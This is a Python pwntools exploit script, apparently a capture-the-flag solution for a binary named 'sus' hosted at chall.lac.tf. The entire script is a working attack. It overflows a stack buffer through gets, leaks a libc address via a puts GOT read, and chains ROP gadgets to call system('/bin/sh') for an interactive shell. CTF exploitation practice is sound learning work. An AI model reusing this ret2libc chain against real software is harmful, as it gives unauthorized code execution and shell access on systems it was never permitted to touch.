#!/usr/bin/python3

from pwn import *

exe = ELF('sus_patched', checksec=False)
libc = ELF('libc6_2.36-9+deb12u4_amd64.so', checksec=False)
context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''

                b* 0x000000000040119c
                
                c
                ''')
                input()
rop = ROP(exe)
# rop.write(7, 8, 9)
# find_gadget(['pop rdi, ret'])
info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('chall.lac.tf', 31284)
else:
        p = process(exe.path)

GDB()
payload = b'a'*56 + p64(1) + p64(0x404a00+0x40) + flat(
        0x401184, # gets


        # 0x401190, # mov rax, [rbp-8]
        # exe.plt.puts,
)
sla(b'sus?\n', payload)
sleep(3)

payload = flat(0x401190, exe.plt.puts).ljust(48) + p64(exe.got.puts) + p64(exe.got.puts) + p64(0x404a30+8)
payload += flat(
        exe.plt.puts, exe.sym.main
)
sl(payload)
libc.address = u64(p.recv(6).ljust(8, b'\0')) - libc.sym.puts
info("libc: " + hex(libc.address))
sleep(2)
payload = b'a'*56 + p64(1) + p64(0x404d00+0x40) + flat(
        libc.address + 0x00000000000277e6,
        libc.address + 0x00000000000277e5,
        next(libc.search(b'/bin/sh')),
        libc.sym.system
)
sl(payload)
p.interactive()
